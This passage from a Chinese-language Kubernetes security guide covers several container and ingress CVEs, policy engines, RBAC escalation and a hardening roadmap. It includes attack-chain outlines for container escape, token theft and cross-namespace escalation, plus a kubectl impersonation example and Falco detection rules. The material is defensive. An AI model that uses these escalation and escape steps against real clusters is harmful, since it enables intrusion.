    (proc.cmdline contains "reload" or proc.cmdline contains "-s")
  output: "Suspicious NGINX reload in ingress controller (user=%user.name cmdline=%proc.cmdline)"
  priority: CRITICAL
  tags: [kubernetes, ingress, cve-2025-1974]

# Sigma 检测 — 审计日志中可疑 Ingress 创建
# 查找短时间内大量 Ingress 创建（可能是暴力利用）
kubectl get events -A --field-selector reason=Created | grep Ingress
```

#### 缓解措施

```bash
# 1. 立即升级
kubectl set image deployment/ingress-nginx-controller \
  controller=registry.k8s.io/ingress-nginx/controller:v1.12.1 \
  -n ingress-nginx

# 2. 限制 Admission Webhook 网络访问
# 仅允许 kube-apiserver 访问 webhook 端口
kubectl patch svc ingress-nginx-controller -n ingress-nginx -p '
{"spec":{"loadBalancerSourceRanges":["<API_SERVER_CIDR>"]}}'

# 3. 审计已有 Ingress 对象
kubectl get ingress -A -o yaml | grep -i "configuration-snippet\|server-snippet\|lua"
```

**参考**: [Wiz Blog: IngressNightmare](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities) | [ProjectDiscovery 分析](https://projectdiscovery.io/blog/ingressnightmare-unauth-rce-in-ingress-nginx) | [Datadog 安全实验室](https://securitylabs.datadoghq.com/articles/kubernetes-ingress-nginx-retirement-warning/)

### C.3 CVE-2025-23266 深度分析 — "NVIDIAScape"

**发现者**: Wiz Research | **CVSS**: 9.0 Critical | **影响**: 37% 云环境

#### 攻击原理

NVIDIA Container Toolkit 在容器启动时执行**特权宿主进程**来设置 GPU 访问。该过程中存在 **TOCTOU（Time-of-Check-to-Time-of-Use）竞态条件**：

```
攻击链：
1. 攻击者构建恶意容器镜像（含特制 Dockerfile/entrypoint）
2. NCT hook 以 root 在宿主执行 → 创建 GPU 设备文件
3. 恶意容器进程利用 TOCTOU 竞态窗口 → 替换/篡改文件路径
4. 宿主 root 进程按被篡改的路径操作 → 写入攻击者控制位置
5. 容器逃逸 → 获得宿主 root 权限
```

#### 检测方法

```bash
# 检查 NVIDIA Container Toolkit 版本
nvidia-container-cli --version
# 或在节点上
dpkg -l | grep nvidia-container-toolkit

# 检查哪些 Pod 使用 GPU
kubectl get pods -A -o json | jq -r '.items[] |
  select(.spec.containers[].resources.limits."nvidia.com/gpu" != null) |
  "\(.metadata.namespace)/\(.metadata.name)"'

# Falco 规则 — 检测可疑 GPU 容器操作
- rule: Suspicious NVIDIA Container Toolkit Operation
  desc: Detect potential NVIDIAScape exploitation
  condition: >
    container and
    (proc.name = "nvidia-container-cli" or proc.name = "nvidia-container-hook") and
    (proc.cmdline contains "create" or proc.cmdline contains "install") and
    not proc.pname in (containerd, docker, dockerd)
  output: "Suspicious NCT operation (user=%user.name cmd=%proc.cmdline image=%container.image.repository)"
  priority: CRITICAL
  tags: [container, gpu, cve-2025-23266, nvidiascape]
```

#### 缓解措施

```bash
# 升级 NVIDIA Container Toolkit
# Ubuntu/Debian
apt-get update && apt-get install nvidia-container-toolkit=1.17.8+

# Helm（GPU Operator）
helm upgrade nvidia-gpu-operator nvidia/gpu-operator \
  --set nvidia-container-toolkit.version=1.17.8

# 限制 GPU Pod 的特权（如果不需要完整 GPU 访问）
# 使用 NVIDIA GPU Federation 或时间分片
```

**参考**: [Wiz Blog: NVIDIAScape](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape) | [GHSA Advisory](https://github.com/advisories/GHSA-vmg3-7v43-9g23)

### C.4 CVE-2026-31431 深度分析 — "Copy Fail"

**CVSS**: 7.8 High | **影响**: 所有主要 Linux 发行版 | **漏洞存在**: 2017 年至今

#### 攻击原理

Linux 内核 `crypto: algif_aead` 子系统中的逻辑缺陷允许**任何非特权本地用户写入任何可读文件**：

```
攻击链（容器环境）：
1. 攻击者在容器内获得代码执行（Web 漏洞/RCE）
2. 利用 CVE-2026-31431 → 修改容器内 /etc/shadow 或其他敏感文件
3. 提升为容器 root → 利用其他逃逸技术逃至宿主
4. 或直接利用该漏洞影响共享内核的宿主文件系统
```

#### K8s 环境检测

```bash
# 检查内核版本是否受影响
uname -r
# 大多数 <6.x 内核受影响

# 检查 AF_ALG 可用性（漏洞利用前提）
cat /proc/kallsyms | grep algif_aead
# 或在容器内
ls /proc/crypto | head -5

# Docker Engine 版本检查
docker version --format '{{.Server.Version}}'
# 需要 ≥29.4.3

# Kubernetes 节点内核检查脚本
kubectl get nodes -o json | jq -r '.items[] |
  "\(.metadata.name): \(.status.nodeInfo.kernelVersion)"'
```

#### 缓解优先级

```bash
# P0 — 升级 Docker Engine
# 升级至 v29.4.3+
apt-get install docker-ce=5:29.4.3*

# P0 — 内核补丁（长期方案）
# 启用 seccomp 过滤 AF_ALG 系统调用
# Pod Security Standard restricted 级别默认包含此保护

# P1 — Cilium eBPF 运行时保护
# 使用 Tetragon 或类似 eBPF 工具监控 crypto 系统调用
```

**参考**: [Docker Blog: Mitigating CVE-2026-31431](https://www.docker.com/blog/mitigating-cve-2026-31431-copy-fail-in-docker-engine/) | [CERT-EU Advisory 2026-005](https://cert.europa.eu/publications/security-advisories/2026-005/) | [K8s 链式利用分析](https://medium.com/@saket590/from-container-user-to-node-root-chaining-copy-fail-cve-2026-31431-in-kubernetes-7af2f04492ad)

### C.5 策略引擎演进 — Kyverno vs OPA Gatekeeper（2025-2026 更新）

#### 对比矩阵

| 维度 | Kyverno (CNCF Graduated) | OPA Gatekeeper (CNCF Graduated) |
|------|---------|----------------|
| **策略语言** | 原生 K8s YAML（无需新语言） | Rego DSL（学习曲线陡） |
| **安装复杂度** | Helm 一键安装 | Helm 安装 + 理解 Rego |
| **变更能力** | ✅ 原生支持 Mutation（修改资源） | ⚠️ 需要额外配置 |
| **生成能力** | ✅ 自动生成资源（如 NetworkPolicy） | ❌ 不支持 |
| **镜像验证** | ✅ 内置 Sigstore/Cosign 验证 | ⚠️ 需额外配置 |
| **复杂逻辑** | ⚠️ 受限于 YAML 表达力 | ✅ Rego 图灵完备 |
| **外部数据** | ⚠️ 有限支持 | ✅ 原生支持外部数据源 |
| **社区趋势** | 🔥 增长最快（2025-2026 推荐） | 稳定成熟 |

#### Kyverno 关键策略示例

```yaml
# 验证镜像签名（Sigstore/Cosign）
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signatures
spec:
  validationFailureAction: Enforce
  background: false
  rules:
  - name: verify-registry-signature
    match:
      any:
      - resources:
          kinds:
          - Pod
    verifyImages:
    - imageReferences:
      - "myregistry.io/*"
      attestors:
      - entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              <YOUR_PUBLIC_KEY>
              -----END PUBLIC KEY-----
---
# 自动为所有 Pod 添加 NetworkPolicy
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: add-default-networkpolicy
spec:
  rules:
  - name: default-deny-ingress
    match:
      any:
      - resources:
          kinds:
          - Namespace
    generate:
      apiVersion: networking.k8s.io/v1
      kind: NetworkPolicy
      name: default-deny-ingress
      namespace: "{{request.object.metadata.name}}"
      synchronize: true
      data:
        spec:
          podSelector: {}
          policyTypes:
          - Ingress
```

**参考**: [Nirmata 对比分析 (2025-02)](https://nirmata.com/2025/02/07/kubernetes-policy-comparison-kyverno-vs-opa-gatekeeper/) | [TheNewStack](https://thenewstack.io/simplify-kubernetes-security-with-kyverno-and-opa-gatekeeper/) | [Kubescape + Kyverno 集成](https://kubescape.io/)

### C.6 K8s RBAC 提权新攻击路径

#### 跨命名空间引用漏洞（Cross-Namespace Reference Vulnerability）

arXiv 2025 发表的研究首次系统性地调查了 **Kubernetes Operator 的跨命名空间引用漏洞**：

```
攻击场景：
1. 某些 Operator 在处理跨命名空间资源引用时缺乏验证
2. 攻击者在低权限命名空间创建恶意 CRD
3. CRD 中包含对高权限命名空间资源的引用
4. Operator 以高权限处理 → 在目标命名空间执行操作
5. 攻击者实现跨命名空间提权
```

#### AKS RunCommand Token 窃取

Cymulate 披露的 AKS RunCommand 弱点：

```bash
# 攻击链（Azure AKS 特有）
# 1. 攻击者获得 AKS 节点访问
# 2. 利用 RunCommand 功能 → 触发特权 Entra ID Token 生成
# 3. 拦截 Token → 跨集群横向移动

# 检测：监控 RunCommand API 调用
az monitor activity-log list --resource-group <RG> \
  --caller "Microsoft.ContainerService" \
  --query "[?contains(operationName.value, 'runCommand')]"
```

#### RBAC Impersonation 攻击

```bash
# 检查是否允许 impersonation（高危）
kubectl auth can-i impersonate users --as=system:serviceaccount:default:dev-sa
kubectl auth can-i impersonate groups --as=system:serviceaccount:default:dev-sa
kubectl auth can-i impersonate serviceaccounts --as=system:serviceaccount:default:dev-sa

# 如果 SA 有 impersonate 权限 → 可模拟任意用户/SA
kubectl get pods --as=system:serviceaccount:kube-system:cluster-autoscaler

# 防御：审计所有 impersonate 权限
kubectl get clusterroles -o json | jq -r '.items[] |
  select(.rules[]?.verbs[]? == "impersonate") |
  "\(.metadata.name): \(.rules[] | select(.verbs[]? == "impersonate"))"' 
```

**参考**: [arXiv: Cross-Namespace Reference Vulnerabilities](https://arxiv.org/html/2507.03387v1) | [Cymulate: AKS RunCommand](https://cymulate.com/blog/aks-runcommand-token-theft-cross-cluster-lateral-movement/) | [Unit 42: RBAC 提权](https://unit42.paloaltonetworks.com/kubernetes-privilege-escalation/) | [SCHUTZWERK: RBAC Paths](https://www.schutzwerk.com/en/blog/kubernetes-privilege-escalation-01/)

### C.7 工具生态更新（2025-2026）

#### 核心安全工具矩阵

| 工具 | 类别 | 版本/更新 | 用途 |
|------|------|-----------|------|
| **Kubescape** | 态势管理 | v3+ (CNCF Graduated) | NSA/CISA 加固框架合规、RBAC 可视化 |
| **Trivy** | 漏洞扫描 | v0.58+ | 镜像/IaC/K8s 全栈扫描、Secret 检测 |
| **Falco** | 运行时检测 | v0.38+ | 内核/syscall 级实时异常检测 |
| **Kyverno** | 策略引擎 | v1.12+ | 原生 YAML 策略、Mutation、镜像验证 |
| **Cilium** | 网络安全 | v1.16+ | eBPF 网络策略、Hubble 可观测性 |
| **Tetragon** | eBPF 安全 | v1.2+ | 内核级进程监控、实时策略执行 |
| **KubeArmor** | 运行时防护 | v1.x | 容器行为限制、文件/进程/网络策略 |
| **Kube-bench** | CIS 合规 | v0.9.4+ | CIS Benchmark 自动检查 |
| **kubesec** | Manifest 扫描 | v2 | Pod 安全评分、CI/CD 集成 |
| **rakkess** | RBAC 可视化 | v0.7+ | 矩阵化 RBAC 权限展示 |
| **Kubeaudit** | 安全审计 | v0.22+ | 自动检测安全配置错误 |
| **Sigstore/Cosign** | 镜像签名 | GA | 容器镜像来源验证 |

#### 工具联动防御架构

```
CI/CD Pipeline:
  Trivy (镜像扫描) → Kyverno (策略验证) → Sigstore/Cosign (签名) → 部署

运行时:
  Falco (syscall 检测) + Tetragon (eBPF 监控) + Cilium (网络策略)

审计:
  Kubescape (态势评估) + Kube-bench (CIS 合规) + kubectl audit (日志)
```

**参考**: [ARMO: Best OSS K8s Security Tools 2026](https://www.armosec.io/blog/best-open-source-kubernetes-security-tools/) | [AccuKnox: Top 5 K8s Security Tools](https://accuknox.com/blog/kubernetes-security-tools) | [Wiz: Top K8s Security Tools](https://wiz.io/academy/container-security/top-kubernetes-security-tools)

### C.8 CNCF Kubernetes 安全 2025-2026 趋势

根据 CNCF 官方博客总结：

| 趋势 | 说明 |
|------|------|
| **Pod Security Standards GA** | PSA 在 K8s 1.26+ 完全替代 PSP，restricted 级别成为生产推荐 |
| **Sigstore 镜像签名普及** | 主流仓库（GHCR/Quay/Docker Hub）原生支持 Cosign 签名验证 |
| **eBPF 安全工具链成熟** | Cilium/Tetragon 成为运行时安全事实标准 |
| **Ingress-NGINX 退役** | 2026-03 计划退役，社区迁移至 Gateway API |
| **Gateway API GA** | 替代 Ingress API，更精细的流量控制和安全策略 |
| **Sidecar 容器原生支持** | K8s 1.29+ 原生 sidecar（initContainer restartPolicy: Always） |
| **Secret 加密增强** | KMS v2 provider GA，支持 AES-GCM + 自动密钥轮换 |
| **Kubernetes AI 安全** | AI Agent 在 K8s 环境中的容器逃逸风险成为新研究方向 |

**参考**: [CNCF Blog: K8s Security 2025-2026](https://www.cncf.io/blog/2025/12/15/kubernetes-security-2025-stable-features-and-2026-preview/)

### C.9 中文社区精华参考

| 来源 | 主题 | 链接 |
|------|------|------|
| 阿里云文档 | 检测利用 runC 漏洞容器逃逸 | [help.aliyun.com](https://help.aliyun.com/zh/security-center/videos/detect-container-escapes-that-exploit-the-runc-vulnerability) |
| 阿里云 ACK | AI 应用容器化部署安全实践 | [help.aliyun.com](https://help.aliyun.com/zh/ack/ack-managed-and-ack-dedicated/security-and-compliance/security-best-practices-for-containerized-ai-applications) |
| 阿里云 ACK | 安全体系概述 | [alibabacloud.com](https://www.alibabacloud.com/help/zh/ack/ack-managed-and-ack-dedicated/security-and-compliance/security-system-overview) |
| Red Hat | 2024 Kubernetes 安全状况报告 | [redhat.com](https://www.redhat.com/zh-cn/blog/state-kubernetes-security-2024) |
| FreeBuf | 容器安全边界 | [freebuf.com](https://m.freebuf.com/articles/container/404062.html) |
| FreeBuf | 容器安全威胁建模 | [freebuf.com](https://m.freebuf.com/articles/container/404059.html) |
| 开源中国 | K8s 命名空间逃逸漏洞解析与防护 | [oschina.net](https://my.oschina.net/emacs_7995897/blog/19676036) |
| 腾讯云 | K8s 安全最佳实践 | K8s 安全加固 + RBAC + NetworkPolicy |

---

### Part D：防御升级路线图

#### P0 — 立即执行（0-7 天）

```
[ ] 升级 Ingress-NGINX 至 v1.12.1+（CVE-2025-1974 IngressNightmare）
[ ] 升级 NVIDIA Container Toolkit 至 v1.17.8+（CVE-2025-23266 NVIDIAScape）
[ ] 检查并修补 CVE-2026-31431（Copy Fail 内核 LPE）
[ ] 升级 Docker Engine 至 v29.4.3+
[ ] 审计所有 cluster-admin 绑定，移除不必要的
[ ] 确认 etcd 启用 TLS 双向认证
[ ] 确认 kubelet --anonymous-auth=false
```

#### P1 — 短期加固（1-4 周）

```
[ ] 部署 Pod Security Standards（restricted 级别 enforced）
[ ] 部署默认拒绝 NetworkPolicy（所有命名空间）
[ ] 启用 Secret 加密（KMS v2 或 AES-GCM）
[ ] 部署 Kyverno 或 Gatekeeper 策略引擎
[ ] 启用 API Server 审计日志
[ ] 部署 Falco 运行时检测
[ ] 禁用默认 SA 自动挂载 token
```

#### P2 — 中期建设（1-3 月）

```
[ ] 实施 Sigstore/Cosign 镜像签名验证
[ ] 部署 Cilium 替代 kube-proxy（eBPF 网络策略）
[ ] 配置 Kubescape 定期态势评估
[ ] 建立 RBAC 审计自动化（CI/CD 集成）
[ ] 迁移至 Gateway API（替代 Ingress-NGINX）
[ ] 部署 Tetragon eBPF 内核级监控
```

#### P3 — 长期运营（持续）

```
[ ] 建立 K8s 安全事件响应 Playbook
[ ] 定期进行 K8s 渗透测试（至少每季度）
[ ] 跟踪 CNCF Kubernetes 安全公告
[ ] 自动化 CVE 扫描与升级流水线
[ ] 实施 Zero Trust 微分段
[ ] AI Agent 容器安全策略制定
```
